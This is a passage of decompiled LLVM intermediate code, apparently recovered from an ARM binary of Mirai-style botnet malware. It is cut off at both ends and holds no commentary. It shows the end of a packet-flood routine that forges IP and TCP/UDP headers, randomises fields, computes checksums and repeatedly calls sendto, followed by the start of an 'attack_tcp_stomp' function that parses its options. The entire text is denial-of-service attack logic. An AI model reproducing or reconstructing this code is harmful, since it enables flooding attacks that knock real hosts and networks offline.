  %v4_b170 = load i32, i32* %v3_b170, align 4
  store i32 %v4_b170, i32* %r3.global-to-local, align 4
  %v2_b174 = load i32, i32* @r6, align 4
  %v3_b174 = add i32 %v2_b174, 16
  %v4_b174 = inttoptr i32 %v3_b174 to i32*
  store i32 %v4_b170, i32* %v4_b174, align 4
  br label %dec_label_pc_b17c

dec_label_pc_b17c:                                ; preds = %bb83, %.thread14
  store i32 %v1_ae4c, i32* %r1.global-to-local, align 4
  store i1 %v2_b338, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b338, label %dec_label_pc_b188, label %dec_label_pc_b344

dec_label_pc_b188:                                ; preds = %dec_label_pc_b17c, %dec_label_pc_b330, %dec_label_pc_b344
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b18c = load i32, i32* @r5, align 4
  %v3_b18c = add i32 %v2_b18c, 10
  %v4_b18c = inttoptr i32 %v3_b18c to i16*
  store i16 0, i16* %v4_b18c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b194 = load i32, i32* @r5, align 4
  store i32 %v0_b194, i32* @r0, align 4
  %v2_b198 = call i32 @checksum_generic(i32 %v0_b194, i32 20)
  %v3_b198 = trunc i32 %v2_b198 to i16
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_b1a0 = load i32, i32* @r5, align 4
  %v4_b1a0 = add i32 %v3_b1a0, 10
  %v5_b1a0 = inttoptr i32 %v4_b1a0 to i16*
  store i16 %v3_b198, i16* %v5_b1a0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b1a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_b1a8 = trunc i32 %v0_b1a8 to i16
  %v2_b1a8 = load i32, i32* @r6, align 4
  %v3_b1a8 = add i32 %v2_b1a8, 10
  %v4_b1a8 = inttoptr i32 %v3_b1a8 to i16*
  store i16 %v1_b1a8, i16* %v4_b1a8, align 2
  %v0_b1ac = load i32, i32* @r6, align 4
  store i32 %v0_b1ac, i32* @r0, align 4
  %v2_b1b0 = call i32 @checksum_generic(i32 %v0_b1ac, i32 20)
  %v3_b1b0 = trunc i32 %v2_b1b0 to i16
  %v3_b1b4 = load i32, i32* @r6, align 4
  %v4_b1b4 = add i32 %v3_b1b4, 10
  %v5_b1b4 = inttoptr i32 %v4_b1b4 to i16*
  store i16 %v3_b1b0, i16* %v5_b1b4, align 2
  %v2_b1bc = load i32, i32* @r7, align 4
  %v3_b1bc = add i32 %v2_b1bc, 6
  %v4_b1bc = inttoptr i32 %v3_b1bc to i16*
  store i16 0, i16* %v4_b1bc, align 2
  %v0_b1c0 = load i32, i32* @r7, align 4
  store i32 %v0_b1c0, i32* @r1, align 4
  %v1_b1c4 = add i32 %v0_b1c0, 4
  %v2_b1c4 = inttoptr i32 %v1_b1c4 to i16*
  %v3_b1c4 = load i16, i16* %v2_b1c4, align 2
  %v4_b1c4 = zext i16 %v3_b1c4 to i32
  store i32 %v4_b1c4, i32* %r2.global-to-local, align 4
  %v0_b1c8 = load i32, i32* @sb, align 4
  store i32 %v0_b1c8, i32* %r3.global-to-local, align 4
  %v0_b1cc = load i32, i32* @r6, align 4
  %v4_b1d0 = call i32 @checksum_tcpudp(i32 %v0_b1cc, i32 %v0_b1c0, i32 %v4_b1c4, i32 %v0_b1c8)
  %v5_b1d0 = trunc i32 %v4_b1d0 to i16
  %v3_b1d4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b1d4, i32* %r2.global-to-local, align 4
  %v3_b1d8 = mul i32 %v3_b1d4, 32
  store i32 %v3_b1d8, i32* %r3.global-to-local, align 4
  %v0_b1dc = load i32, i32* @r5, align 4
  %v1_b1dc = add i32 %v0_b1dc, 16
  %v2_b1dc = inttoptr i32 %v1_b1dc to i32*
  %v3_b1dc = load i32, i32* %v2_b1dc, align 4
  %v5_b1e0 = mul i32 %v3_b1d4, 24
  store i32 %v5_b1e0, i32* %r3.global-to-local, align 4
  %v1_b1e4 = load i32, i32* @sl, align 4
  %v2_b1e4 = add i32 %v1_b1e4, %v5_b1e0
  store i32 %v2_b1e4, i32* @lr, align 4
  %v2_b1e8 = add i32 %v2_b1e4, 4
  %v3_b1e8 = inttoptr i32 %v2_b1e8 to i32*
  store i32 %v3_b1dc, i32* %v3_b1e8, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_b1f4 = load i32, i32* @r7, align 4
  %v4_b1f4 = add i32 %v3_b1f4, 6
  %v5_b1f4 = inttoptr i32 %v4_b1f4 to i16*
  store i16 %v5_b1d0, i16* %v5_b1f4, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b1fc = load i32, i32* %r1.global-to-local, align 4
  %v1_b1fc = trunc i32 %v0_b1fc to i16
  %v2_b1fc = load i32, i32* %r3.global-to-local, align 4
  %v3_b1fc = load i32, i32* @sl, align 4
  %v4_b1fc = add i32 %v3_b1fc, %v2_b1fc
  %v5_b1fc = inttoptr i32 %v4_b1fc to i16*
  store i16 %v1_b1fc, i16* %v5_b1fc, align 2
  %v0_b200 = load i32, i32* %r2.global-to-local, align 4
  %v1_b200 = trunc i32 %v0_b200 to i16
  %v2_b200 = load i32, i32* @lr, align 4
  %v3_b200 = add i32 %v2_b200, 2
  %v4_b200 = inttoptr i32 %v3_b200 to i16*
  store i16 %v1_b200, i16* %v4_b200, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b208 = load i32, i32* @r5, align 4
  store i32 %v0_b208, i32* %r1.global-to-local, align 4
  %v0_b210 = load i32, i32* @r8, align 4
  store i32 %v0_b210, i32* %r2.global-to-local, align 4
  %v0_b214 = load i32, i32* @lr, align 4
  %v0_b218 = load i32, i32* %ip.global-to-local, align 4
  %v6_b21c = call i32 @__libc_sendto(i32 %v3_aea4, i32 %v0_b208, i32 %v0_b210, i32 16384, i32 %v0_b214, i32 %v0_b218)
  %v3_b220 = load i32, i32* %stack_var_-44, align 4
  %v1_b224 = add i32 %v3_b220, 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v9_b22c = icmp eq i32 %v1_b224, %arg2
  store i1 %v9_b22c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b224, i32* %stack_var_-44, align 4
  %v6_b234 = icmp slt i32 %v1_b224, %arg2
  br i1 %v6_b234, label %dec_label_pc_b238, label %dec_label_pc_b364

dec_label_pc_b238:                                ; preds = %dec_label_pc_b188, %dec_label_pc_b120
  %v1_b24c = phi i32 [ %v1_b224, %dec_label_pc_b188 ], [ 0, %dec_label_pc_b120 ]
  %v5_b23c = mul i32 %v1_b24c, 24
  %v1_b240 = load i32, i32* @sl, align 4
  %v2_b240 = add i32 %v1_b240, %v5_b23c
  store i32 %v2_b240, i32* %r3.global-to-local, align 4
  store i32 %v2_ad60, i32* %r1.global-to-local, align 4
  %v1_b248 = add i32 %v2_b240, 20
  %v2_b248 = inttoptr i32 %v1_b248 to i8*
  %v3_b248 = load i8, i8* %v2_b248, align 1
  %v4_b248 = zext i8 %v3_b248 to i32
  store i32 %v4_b248, i32* %r2.global-to-local, align 4
  %v4_b24c = mul i32 %v1_b24c, 4
  %v5_b24c = add i32 %v4_b24c, %v2_ad60
  %v6_b24c = inttoptr i32 %v5_b24c to i32*
  %v7_b24c = load i32, i32* %v6_b24c, align 4
  store i32 %v7_b24c, i32* @r5, align 4
  %v2_b250 = icmp ugt i8 %v3_b248, 30
  %v7_b250 = icmp eq i8 %v3_b248, 31
  store i1 %v7_b250, i1* %cpsr_z.global-to-local, align 1
  %v1_b254 = add i32 %v7_b24c, 24
  store i32 %v1_b254, i32* @r6, align 4
  %v1_b258 = add i32 %v7_b24c, 44
  store i32 %v1_b258, i32* @r7, align 4
  %v2_b25c = xor i1 %v7_b250, true
  %v3_b25c = and i1 %v2_b250, %v2_b25c
  br i1 %v3_b25c, label %dec_label_pc_b134, label %dec_label_pc_b260

dec_label_pc_b260:                                ; preds = %dec_label_pc_b238
  %v1_b260 = add i32 %v2_b240, 16
  %v2_b260 = inttoptr i32 %v1_b260 to i32*
  %v3_b260 = load i32, i32* %v2_b260, align 4
  store i32 %v3_b260, i32* %r4.global-to-local, align 4
  %v0_b264 = call i32 @rand_next()
  %v3_b268 = load i32, i32* %stack_var_-44, align 4
  %v5_b270 = mul i32 %v3_b268, 24
  %v1_b274 = and i32 %v3_b260, 16711680
  store i32 %v1_b274, i32* %ip.global-to-local, align 4
  %v3_b278 = udiv i32 %v3_b260, 16777216
  %v4_b27c = udiv i32 %v1_b274, 256
  %v5_b27c = or i32 %v4_b27c, %v3_b278
  store i32 %v5_b27c, i32* %r2.global-to-local, align 4
  %v1_b280 = load i32, i32* @sl, align 4
  %v2_b280 = add i32 %v1_b280, %v5_b270
  store i32 %v2_b280, i32* %r1.global-to-local, align 4
  %v1_b284 = and i32 %v3_b260, 65280
  store i32 %v1_b284, i32* %r3.global-to-local, align 4
  %v1_b288 = add i32 %v2_b280, 20
  %v2_b288 = inttoptr i32 %v1_b288 to i8*
  %v3_b288 = load i8, i8* %v2_b288, align 1
  %v4_b288 = zext i8 %v3_b288 to i32
  store i32 %v4_b288, i32* %ip.global-to-local, align 4
  %v5_b290 = call i32 @llvm.bswap.i32(i32 %v3_b260)
  %v7_b294 = lshr i32 %v0_b264, %v4_b288
  %v8_b294 = add i32 %v7_b294, %v5_b290
  %v1_b2a0 = and i32 %v8_b294, 65280
  store i32 %v1_b2a0, i32* %r1.global-to-local, align 4
  %v5_b2ac = call i32 @llvm.bswap.i32(i32 %v8_b294)
  store i32 %v5_b2ac, i32* %r3.global-to-local, align 4
  store i32 %v5_ae80, i32* %r2.global-to-local, align 4
  store i1 %v7_b138, i1* %cpsr_z.global-to-local, align 1
  %v1_b2b8 = load i32, i32* @r5, align 4
  %v2_b2b8 = add i32 %v1_b2b8, 16
  %v3_b2b8 = inttoptr i32 %v2_b2b8 to i32*
  store i32 %v5_b2ac, i32* %v3_b2b8, align 4
  br i1 %v2_b138, label %dec_label_pc_b2c0, label %dec_label_pc_b140

dec_label_pc_b2c0:                                ; preds = %dec_label_pc_b260, %dec_label_pc_b134
  %v0_b2c0 = call i32 @rand_next()
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* @r4, align 4
  %v0_b2cc = load i32, i32* @fp, align 4
  %v9_b2cc = icmp eq i32 %v0_b2cc, ptrtoint ([3 x i8]* @global_var_ffff.36 to i32)
  store i1 %v9_b2cc, i1* %cpsr_z.global-to-local, align 1
  %v1_b2d0 = load i32, i32* @r5, align 4
  %v2_b2d0 = add i32 %v1_b2d0, 12
  %v3_b2d0 = inttoptr i32 %v2_b2d0 to i32*
  store i32 %v0_b2c0, i32* %v3_b2d0, align 4
  br i1 %v9_b2cc, label %dec_label_pc_b2d8, label %dec_label_pc_b2c0.dec_label_pc_b150_crit_edge

dec_label_pc_b2c0.dec_label_pc_b150_crit_edge:    ; preds = %dec_label_pc_b2c0
  %v1_b154.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b150

dec_label_pc_b2d8:                                ; preds = %dec_label_pc_b2c0, %dec_label_pc_b140
  %v0_b2d8 = call i32 @rand_next()
  %v3_b2e0 = urem i32 %v0_b2d8, 65536
  %v1_b2e8 = sub nsw i32 999, %v3_b2e0
  store i32 %v1_b2e8, i32* %r3.global-to-local, align 4
  %v1_b2ec = trunc i32 %v0_b2d8 to i16
  %v2_b2ec = load i32, i32* @r5, align 4
  %v3_b2ec = add i32 %v2_b2ec, 4
  %v4_b2ec = inttoptr i32 %v3_b2ec to i16*
  store i16 %v1_b2ec, i16* %v4_b2ec, align 2
  %v0_b2f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2f0 = trunc i32 %v0_b2f0 to i16
  %v2_b2f0 = load i32, i32* @r6, align 4
  %v3_b2f0 = add i32 %v2_b2f0, 4
  %v4_b2f0 = inttoptr i32 %v3_b2f0 to i16*
  store i16 %v1_b2f0, i16* %v4_b2f0, align 2
  store i32 %v3_aefc, i32* %r3.global-to-local, align 4
  %v1_b2f8 = load i32, i32* @r4, align 4
  %v9_b2f8 = icmp eq i32 %v3_aefc, %v1_b2f8
  store i1 %v9_b2f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b2f8, label %dec_label_pc_b300, label %dec_label_pc_b15c

dec_label_pc_b300:                                ; preds = %dec_label_pc_b2d8, %dec_label_pc_b150
  %v0_b300 = call i32 @rand_next()
  %v1_b300 = trunc i32 %v0_b300 to i16
  store i32 %v3_af00, i32* %ip.global-to-local, align 4
  %v1_b308 = load i32, i32* @r4, align 4
  %v9_b308 = icmp eq i32 %v3_af00, %v1_b308
  store i1 %v9_b308, i1* %cpsr_z.global-to-local, align 1
  %v3_b30c = load i32, i32* @r5, align 4
  %v4_b30c = add i32 %v3_b30c, 44
  %v5_b30c = inttoptr i32 %v4_b30c to i16*
  store i16 %v1_b300, i16* %v5_b30c, align 2
  br i1 %v9_b308, label %dec_label_pc_b314, label %dec_label_pc_b168

dec_label_pc_b314:                                ; preds = %dec_label_pc_b300, %dec_label_pc_b15c
  %v0_b314 = call i32 @rand_next()
  %v1_b314 = trunc i32 %v0_b314 to i16
  store i32 %v1_aef8, i32* @lr, align 4
  store i1 %v2_b31c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b31c, label %.thread29, label %bb83

.thread29:                                        ; preds = %dec_label_pc_b314
  %v3_b32430 = load i32, i32* @r7, align 4
  %v4_b32431 = add i32 %v3_b32430, 2
  %v5_b32432 = inttoptr i32 %v4_b32431 to i16*
  store i16 %v1_b314, i16* %v5_b32432, align 2
  br label %dec_label_pc_b330

bb83:                                             ; preds = %dec_label_pc_b314
  %v1_b320 = load i32, i32* @r5, align 4
  %v2_b320 = add i32 %v1_b320, 16
  %v3_b320 = inttoptr i32 %v2_b320 to i32*
  %v4_b320 = load i32, i32* %v3_b320, align 4
  store i32 %v4_b320, i32* %r3.global-to-local, align 4
  %v3_b324 = load i32, i32* @r7, align 4
  %v4_b324 = add i32 %v3_b324, 2
  %v5_b324 = inttoptr i32 %v4_b324 to i16*
  store i16 %v1_b314, i16* %v5_b324, align 2
  %v1_b328 = load i32, i32* %r3.global-to-local, align 4
  %v2_b328 = load i32, i32* @r6, align 4
  %v3_b328 = add i32 %v2_b328, 16
  %v4_b328 = inttoptr i32 %v3_b328 to i32*
  store i32 %v1_b328, i32* %v4_b328, align 4
  br label %dec_label_pc_b17c

dec_label_pc_b330:                                ; preds = %.thread29, %dec_label_pc_b168
  %v0_b330 = call i32 @rand_next()
  store i32 %v1_ae4c, i32* %r1.global-to-local, align 4
  store i1 %v2_b338, i1* %cpsr_z.global-to-local, align 1
  %v1_b33c = load i32, i32* @r6, align 4
  %v2_b33c = add i32 %v1_b33c, 16
  %v3_b33c = inttoptr i32 %v2_b33c to i32*
  store i32 %v0_b330, i32* %v3_b33c, align 4
  br i1 %v2_b338, label %dec_label_pc_b188, label %dec_label_pc_b344

dec_label_pc_b344:                                ; preds = %dec_label_pc_b17c, %dec_label_pc_b330
  %v0_b344 = load i32, i32* @r7, align 4
  %v1_b344 = add i32 %v0_b344, 8
  store i32 %v1_b344, i32* @r4, align 4
  store i32 %v5_ae2c, i32* %r1.global-to-local, align 4
  %v2_b350 = call i32 @rand_alphastr(i32 %v1_b344, i32 %v5_ae2c)
  store i32 %v5_ae2c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b35c = load i32, i32* @r4, align 4
  %v4_b35c = add i32 %v2_b35c, %v5_ae2c
  %v5_b35c = inttoptr i32 %v4_b35c to i8*
  store i8 0, i8* %v5_b35c, align 1
  br label %dec_label_pc_b188

dec_label_pc_b364:                                ; preds = %dec_label_pc_b188, %dec_label_pc_b10c
  %v2_b368 = call i32 @__GI_time(i32* null)
  store i32 %v2_ae90, i32* %ip.global-to-local, align 4
  %v9_b370 = icmp eq i32 %v2_ae90, %v2_b368
  store i1 %v9_b370, i1* %cpsr_z.global-to-local, align 1
  %v6_b374 = icmp slt i32 %v2_ae90, %v2_b368
  br i1 %v6_b374, label %dec_label_pc_b378, label %dec_label_pc_b10c

dec_label_pc_b378:                                ; preds = %dec_label_pc_b364, %entry, %dec_label_pc_b384
  %v1_b380 = phi i32 [ %v3_aea4, %entry ], [ %v1_b388, %dec_label_pc_b384 ], [ %v2_b368, %dec_label_pc_b364 ]
  store i32 %v3_ad34, i32* %r4.global-to-local, align 4
  store i32 %v24_ad34, i32* %fp.global-to-local, align 4
  store i32 %v27_ad34, i32* %lr.global-to-local, align 4
  ret i32 %v1_b380

dec_label_pc_b384:                                ; preds = %dec_label_pc_aeb4
  %v1_b388 = call i32 @__GI___libc_close(i32 %v3_aea4)
  br label %dec_label_pc_b378

; uselistorder directives
  uselistorder i16 %v1_b314, { 1, 0 }
  uselistorder i32 %v1_b2f8, { 1, 0 }
  uselistorder i32 %v0_b2d8, { 1, 0 }
  uselistorder i32 %v5_b2ac, { 1, 0 }
  uselistorder i32 %v3_b260, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v7_b24c, { 1, 0, 2 }
  uselistorder i32 %v1_b224, { 1, 2, 0, 3 }
  uselistorder i32 %v3_b1d4, { 1, 0, 2 }
  uselistorder i1 %v2_b338, { 2, 3, 1, 0 }
  uselistorder i1 %v2_b31c, { 2, 3, 1, 0 }
  uselistorder i1 %v7_b138, { 2, 1, 0 }
  uselistorder i32 %v0_b0b8, { 1, 0 }
  uselistorder i32 %v1_af40, { 1, 0 }
  uselistorder i32 %v3_af2c, { 2, 1, 0 }
  uselistorder i1 %v2_af04, { 1, 0, 2, 3 }
  uselistorder i32 %v1_aef8, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v3_aef4, { 1, 0 }
  uselistorder i32 %v0_aef0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_aedc, { 2, 0, 1, 3 }
  uselistorder i1 %v7_aed4, { 1, 0 }
  uselistorder i1 %v7_aea8, { 1, 0 }
  uselistorder i32 %v3_aea4, { 3, 1, 4, 2, 0 }
  uselistorder i32 %v2_ae90, { 2, 1, 0 }
  uselistorder i32 %v5_ae80, { 3, 4, 0, 5, 1, 2 }
  uselistorder i32 %v1_ae4c, { 2, 1, 3, 0 }
  uselistorder i32 %v5_ae2c, { 1, 4, 3, 2, 5, 7, 6, 0 }
  uselistorder i32 %v1_ade0, { 1, 0 }
  uselistorder i32 %v1_adbc, { 2, 1, 0 }
  uselistorder i32 %v6_adb4, { 1, 0 }
  uselistorder i32 %v8_ad9c, { 1, 0, 4, 3, 2 }
  uselistorder i8 %v5_ad98, { 0, 2, 1 }
  uselistorder i32 %v6_ad78, { 1, 0 }
  uselistorder i32 %v2_ad60, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 18, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 10, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 27, 26, 28, 29, 31, 30, 33, 32, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 14, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i8 47, { 4, 5, 0, 1, 2, 3, 6, 7, 8, 9 }
  uselistorder i32 %arg2, { 6, 5, 4, 7, 1, 0, 3, 2, 8, 9, 10 }
  uselistorder label %dec_label_pc_b378, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b344, { 1, 0 }
  uselistorder label %dec_label_pc_b188, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b10c, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_tcp_stomp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp30 = call i8 @__decompiler_undefined_function_4()
  %tmp31 = call i16 @__decompiler_undefined_function_1()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp34 = call i32 @__decompiler_undefined_function_0()
  %tmp60 = call i16 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_b394 = load i32, i32* @r4, align 4
  %v27_b394 = load i32, i32* @lr, align 4
  store i32 0, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @fp, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_b3c0 = call i32 @calloc(i32 %arg2, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v2_b3d0 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_b3d4 = load i32, i32* @r4, align 4
  store i32 %v0_b3d4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_b3e0 = load i32, i32* @r7, align 4
  store i32 %v0_b3e0, i32* %r3.global-to-local, align 4
  %v0_b3e4 = load i32, i32* @r5, align 4
  store i32 %v0_b3e4, i32* %r0.global-to-local, align 4
  %v5_b3e8 = inttoptr i32 %v0_b3d4 to i32*
  %v6_b3e8 = call i32 @attack_get_opt_int(i32 %v0_b3e4, i32* %v5_b3e8, i32 2, i32 %v0_b3e0)
  %v1_b3f4 = urem i32 %v6_b3e8, 256
  store i32 %v1_b3f4, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b400 = load i32, i32* @r4, align 4
  store i32 %v0_b400, i32* %r1.global-to-local, align 4
  %v0_b404 = load i32, i32* @r5, align 4
  store i32 %v0_b404, i32* %r0.global-to-local, align 4
  %v5_b408 = trunc i32 %v6_b3e8 to i8
  %v7_b40c = inttoptr i32 %v0_b400 to i32*
  %v8_b40c = call i32 @attack_get_opt_int(i32 %v0_b404, i32* %v7_b40c, i32 3, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_b410 = load i32, i32* @r4, align 4
  store i32 %v0_b410, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v8_b40c, i32* @r8, align 4
  %v0_b420 = load i32, i32* @r5, align 4
  store i32 %v0_b420, i32* %r0.global-to-local, align 4
  %v4_b424 = inttoptr i32 %v0_b410 to i32*
  %v5_b424 = call i32 @attack_get_opt_int(i32 %v0_b420, i32* %v4_b424, i32 4, i32 64)
  %v1_b42c = urem i32 %v5_b424, 256
  store i32 %v1_b42c, i32* %ip.global-to-local, align 4
  %v0_b430 = load i32, i32* @r4, align 4
  store i32 %v0_b430, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b43c = load i32, i32* @r5, align 4
  store i32 %v0_b43c, i32* %r0.global-to-local, align 4
  %v5_b440 = trunc i32 %v5_b424 to i8
  %v6_b444 = inttoptr i32 %v0_b430 to i32*
  %v7_b444 = call i32 @attack_get_opt_int(i32 %v0_b43c, i32* %v6_b444, i32 5, i32 1)
  %v1_b450 = urem i32 %v7_b444, 256
  store i32 %v1_b450, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  %v0_b458 = load i32, i32* @r4, align 4
  store i32 %v0_b458, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b460 = load i32, i32* @r5, align 4
  store i32 %v0_b460, i32* %r0.global-to-local, align 4
  %v6_b468 = inttoptr i32 %v0_b458 to i32*
  %v7_b468 = call i32 @attack_get_opt_int(i32 %v0_b460, i32* %v6_b468, i32 7, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_b46c = load i32, i32* @r4, align 4
  store i32 %v0_b46c, i32* %r1.global-to-local, align 4
  %v3_b470 = mul i32 %v7_b468, 65536
  store i32 %v3_b470, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v0_b478 = load i32, i32* @r7, align 4
  store i32 %v0_b478, i32* %r3.global-to-local, align 4
  %v0_b47c = load i32, i32* @r5, align 4
  store i32 %v0_b47c, i32* %r0.global-to-local, align 4
  %v3_b480 = urem i32 %v7_b468, 65536
  store i32 %v3_b480, i32* @sb, align 4
  %v4_b484 = inttoptr i32 %v0_b46c to i32*
  %v5_b484 = call i32 @attack_get_opt_int(i32 %v0_b47c, i32* %v4_b484, i32 10, i32 %v0_b478)
  %v1_b48c = urem i32 %v5_b484, 256
  store i32 %v1_b48c, i32* %ip.global-to-local, align 4
  %v0_b490 = load i32, i32* @r4, align 4
  store i32 %v0_b490, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b49c = load i32, i32* @r5, align 4
  store i32 %v0_b49c, i32* %r0.global-to-local, align 4
  %v5_b4a4 = inttoptr i32 %v0_b490 to i32*
  %v6_b4a4 = call i32 @attack_get_opt_int(i32 %v0_b49c, i32* %v5_b4a4, i32 11, i32 1)
  %v1_b4ac = urem i32 %v6_b4a4, 256
  store i32 %v1_b4ac, i32* %ip.global-to-local, align 4
  %v0_b4b0 = load i32, i32* @r4, align 4
  store i32 %v0_b4b0, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b4bc = load i32, i32* @r5, align 4
  store i32 %v0_b4bc, i32* %r0.global-to-local, align 4
  %v5_b4c4 = inttoptr i32 %v0_b4b0 to i32*
  %v6_b4c4 = call i32 @attack_get_opt_int(i32 %v0_b4bc, i32* %v5_b4c4, i32 12, i32 1)
  %v1_b4cc = urem i32 %v6_b4c4, 256
  store i32 %v1_b4cc, i32* %ip.global-to-local, align 4
  %v0_b4d0 = load i32, i32* @r4, align 4
  store i32 %v0_b4d0, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_b4d8 = load i32, i32* @r7, align 4
  store i32 %v0_b4d8, i32* %r3.global-to-local, align 4
  %v0_b4dc = load i32, i32* @r5, align 4
  store i32 %v0_b4dc, i32* %r0.global-to-local, align 4
  %v5_b4e4 = inttoptr i32 %v0_b4d0 to i32*
  %v6_b4e4 = call i32 @attack_get_opt_int(i32 %v0_b4dc, i32* %v5_b4e4, i32 13, i32 %v0_b4d8)
  %v1_b4ec = urem i32 %v6_b4e4, 256
  store i32 %v1_b4ec, i32* %ip.global-to-local, align 4
  %v0_b4f0 = load i32, i32* @r4, align 4
  store i32 %v0_b4f0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v0_b4f8 = load i32, i32* @r7, align 4
  store i32 %v0_b4f8, i32* %r3.global-to-local, align 4
  %v0_b4fc = load i32, i32* @r5, align 4
  store i32 %v0_b4fc, i32* %r0.global-to-local, align 4
  %v5_b504 = inttoptr i32 %v0_b4f0 to i32*
  %v6_b504 = call i32 @attack_get_opt_int(i32 %v0_b4fc, i32* %v5_b504, i32 14, i32 %v0_b4f8)
  %v1_b50c = urem i32 %v6_b504, 256
  store i32 %v1_b50c, i32* %ip.global-to-local, align 4
  %v0_b510 = load i32, i32* @r4, align 4
  store i32 %v0_b510, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_b518 = load i32, i32* @r7, align 4
  store i32 %v0_b518, i32* %r3.global-to-local, align 4
  %v0_b51c = load i32, i32* @r5, align 4
  store i32 %v0_b51c, i32* %r0.global-to-local, align 4
